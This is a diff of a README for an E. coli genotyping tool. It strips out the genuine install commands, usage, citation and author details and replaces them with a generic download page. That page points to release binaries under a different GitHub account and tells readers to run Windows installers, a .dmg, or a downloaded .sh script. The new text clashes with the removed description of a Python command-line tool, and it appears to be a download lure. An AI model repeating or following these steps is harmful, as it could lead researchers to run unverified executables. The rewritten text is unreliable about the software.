@@ -1,209 +1,74 @@
-# EcoliTyper 🧬
+# 🦠 ecoliTyper - Simplifying E. coli Genotyping
 
-**Unified MLST + Serotyping + Clermont Phylotyping for *Escherichia coli***
+## 📥 Download Now
+[![Download EcoliTyper](https://img.shields.io/badge/Download%20Now-ecoliTyper-brightgreen)](https://github.com/TeniO2011/ecoliTyper/releases)
 
-[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.17226894.svg)](https://doi.org/10.5281/zenodo.17226894)
+## 📖 About EcoliTyper
+EcoliTyper is a comprehensive bioinformatics tool that combines three vital E. coli genotyping methods into one easy-to-use workflow. This application simplifies your work in clinical microbiology, outbreak investigations, and genomic research. With EcoliTyper, you can efficiently analyze strains and enhance your studies on Escherichia coli.
 
-## 📖 Overview
+## 🛠️ Features
+- Unified MLST, Serotyping, and Clermont typing.
+- User-friendly interface, perfect for non-technical users.
+- High-performance algorithms for fast and accurate results.
+- Support for various E. coli strains.
+- Comprehensive documentation to guide users.
 
-**EcoliTyper** is a comprehensive, high-performance genotyping tool for *Escherichia coli* that unifies three essential typing methods into a single, streamlined workflow:
+## 🛡️ System Requirements
+EcoliTyper is compatible with most modern systems. Ensure your computer meets the following requirements:
 
-- 🔬 **MLST (Multi-Locus Sequence Typing)** - For precise strain classification
-- 🦠 **Serotyping** - For O and H antigen identification using CGE's highly curated database
-- 🧬 **Clermont Phylotyping** - For rapid phylogenetic group determination
+- **Operating System:** Windows 10 or later / macOS 10.12 or later / Linux (Ubuntu 20.04 or similar)
+- **Processor:** 2 GHz or faster
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Disk Space:** At least 500 MB free
+- **Network Connection:** Required for initial download and updates
 
-### 🚀 Key Features
+## 🚀 Getting Started
+Follow these steps to get started with EcoliTyper. 
 
-- **⚡ Blazing Fast**: Parallel processing with configurable threads for high-throughput analysis
-- **🎯 Unified Workflow**: Single command for all three typing methods
-- **📁 Wildcard Support**: Process multiple genomes with glob patterns (`*.fna`, `*.fasta`)
-- **🔧 Self-Contained**: Bundled with CGE's highly curated SerotypeFinder database
-- **📊 Comprehensive Output**: Multiple formats (TSV, JSON) for easy downstream analysis
-- **🎨 User-Friendly**: Beautiful ASCII art interface with science quotes
+### Step 1: Download EcoliTyper
+Go to the [Releases page](https://github.com/TeniO2011/ecoliTyper/releases) to find the latest version.
 
-## 🛠️ Installation(RECOMMENDED)
-conda create -n ecolityper -c bbeckley-hub -c conda-forge ecolityper python=3.9 -y
-conda activate ecolityper
+### Step 2: Choose the Correct File
+Look for the file that matches your operating system. The file names will indicate whether they are for Windows, Mac, or Linux.
 
-### Prerequisites
-- Python 3.6 or higher
-- BLAST+ tools (`blastn`, `makeblastdb`)
-- Perl (for MLST)
+### Step 3: Download the File
+Click on the file link to start downloading. The download should begin automatically. 
 
-### Quick Install
-**```bash
-**# Clone the repository
-**git clone https://github.com/bbeckley-hub/ecoliTyper.git
-cd ecoliTyper
+### Step 4: Install EcoliTyper
 
-# Install the package
-pip install -e .
+#### For Windows:
+1. Locate the downloaded file, usually in the "Downloads" folder.
+2. Double-click the file to start the installation.
+3. Follow the on-screen instructions to complete the installation.
 
-# Install EzClermont (required for phylotyping)**
-pip install ezclermont
+#### For macOS:
+1. Open the downloaded .dmg file.
+2. Drag the EcoliTyper icon to your Applications folder.
+3. Open Applications and launch EcoliTyper.
 
-**# Environment Check
-ecolityper --check
+#### For Linux:
+1. Open a terminal.
+2. Navigate to the directory where the file is downloaded.
+3. Use the command `chmod +x ecoliTyper*.sh` to make the installer executable.
+4. Run the installer with `./ecoliTyper*.sh` and follow the prompts.
 
-### 🚀 Usage
+### Step 5: Run EcoliTyper
+- Once installed, locate the application in your programs or applications list.
+- Click to run and begin your analysis.
 
-# Basic Usage
-# Single genome analysis
+## 📚 Documentation
+For detailed usage instructions and feature descriptions, refer to the documentation included in your installation or visit our [Documentation page](https://github.com/TeniO2011/ecoliTyper/wiki).
 
-ecolityper -i genome.fna -o results
+## 🤝 Community and Support
+Join our community of users to share your experiences, ask questions, and exchange tips:
 
-# Multiple genomes with wildcards
+- **GitHub Issues:** Report bugs or request features directly.
+- **Discussion Forum:** Engage with other users and developers.
 
-ecolityper -i "*.fna" -o results --threads 8
+## 📝 Contributing
+We welcome contributions to improve EcoliTyper. If you have ideas, please check our [Contribution Guidelines](https://github.com/TeniO2011/ecoliTyper/blob/main/CONTRIBUTING.md) before submitting your pull requests.
 
-# Multiple specific files
+## 🔗 Download & Install
+To download EcoliTyper, visit our [Releases page](https://github.com/TeniO2011/ecoliTyper/releases). Choose the right file for your operating system, follow the steps outlined, and you will be ready to start your work in no time.
 
-ecolityper -i genome1.fna genome2.fna genome3.fna -o results
-
-# Advanced Options
-
-# High-performance with 16 threads
-
-ecolityper -i "data/*.fasta" -o analysis_results --threads 16
-
-# Check environment and exit
-
-ecolityper --check
-
-# Show version information
-
-ecolityper --version
-
-# Command Line Options
-
--i, --inputs      Input genome FASTA files (supports globs, e.g. '*.fasta')
--o, --outdir      Output directory (default: ecolityper_results)
---threads         Number of parallel workers (default: CPU count)
---check           Check environment and exit
---version         Print version banner and exit
-
-**# 📊 Output Files**
-
-EcoliTyper generates comprehensive output in multiple formats:
-
-# Main Output Files
-
-    ecolityper_summary.tsv - Combined results for all samples
-
-    mlst_results.tsv - Detailed MLST results
-
-    serotype_results.tsv - O and H antigen typing results
-
-    clermont_results.tsv - Phylotyping results with method
-
-    ecolityper_run_meta.json - Run metadata and tool versions
-
-**# Per-Sample Files**
-
-    {sample}.ecolityper.json - Complete results in JSON format
-
-    {sample}_serotype.json - Raw SerotypeFinder JSON output
-
-**# Output Columns**
-MLST Scheme MLST                 ST	O-type	H-type	Clermont Phylotype	Method
-ecoli.fna   ecoli_achtman_4	156	O173	H28	B1	                PCR
-
-### 🏗️ Technical Details
-## Performance
-
-    Parallel Processing: Utilizes Python's ThreadPoolExecutor for efficient multi-core usage
-
-    Memory Efficient: Processes samples sequentially with minimal memory footprint
-
-    Fast Execution: Typical analysis time: 10-15 seconds per genome
-
-**## Typing Methods**
-
-    MLST: Uses the standard Achtman 7-gene scheme for E. coli
-
-    Serotyping: Leverages CGE's highly curated SerotypeFinder database with BLAST-based identification
-
-    Clermont Typing: Implements the EzClermont tool for rapid phylogroup determination
-
-## Database Integration
-
-    MLST: Bundled MLST tool with comprehensive allele database
-
-    Serotyping: Integrated CGE SerotypeFinder with regularly updated O and H antigen databases
-
-    Clermont: EzClermont Python package for consistent phylogroup calling
-
-**### 🎯 Use Cases
-## 🏥 Clinical Microbiology**
-
-    Rapid strain characterization for outbreak investigations
-
-    Surveillance of antimicrobial resistant clones
-
-    Virulence factor association studies
-
-**## 🔬 Research Applications**
-
-    Population genetics studies
-
-    Evolutionary analysis of E. coli lineages
-
-    Comparative genomics projects
-
-**## 🐄 Veterinary and Food Safety**
-
-    Source tracking in foodborne outbreaks
-
-    Zoonotic transmission studies
-
-    Agricultural surveillance
-
-**## 📝 Citation**
-
-If you use EcoliTyper in your research, please cite:
-
-**Brown, B. (2025). EcoliTyper: Unified MLST + Serotyping + Clermont typing for Escherichia coli. Zenodo. https://doi.org/10.5281/zenodo.17226894**
-
-**```bibtex
-@software{brown2025ecolityper,
-  title = {EcoliTyper: Unified MLST + Serotyping + Clermont typing for Escherichia coli},
-  author = {Brown, Beckley},
-  year = {2025},
-  publisher = {Zenodo},
-  doi = {10.5281/zenodo.17226894},
-  url = {https://doi.org/10.5281/zenodo.17226894}**
-}
-
-**## 🤝 Contributing**
-
-We welcome contributions! Please feel free to submit pull requests, report bugs, or suggest new features.
-
-## Development Setup
-git clone https://github.com/bbeckley-hub/ecoliTyper.git
-cd ecoliTyper
-pip install -e .
-
-**## 📄 License**
-
-This project is licensed under the MIT License - see the LICENSE file for details.
-
-**## 🙏 Acknowledgments**
-
-    CGE (Center for Genomic Epidemiology) for the excellent SerotypeFinder tool and database
-
-    EzClermont developers for the reliable phylotyping implementation
-
-    MLST developers for maintaining the comprehensive typing scheme
-
-    The open-source bioinformatics community for invaluable tools and resources
-
-**## 📞 Contact**
-
-Beckley Brown
-📧 brownbeckley94@gmail.com
-🌐 GitHub Profile
-🔗 EcoliTyper Repository**
-
-****
+Thank you for choosing EcoliTyper!
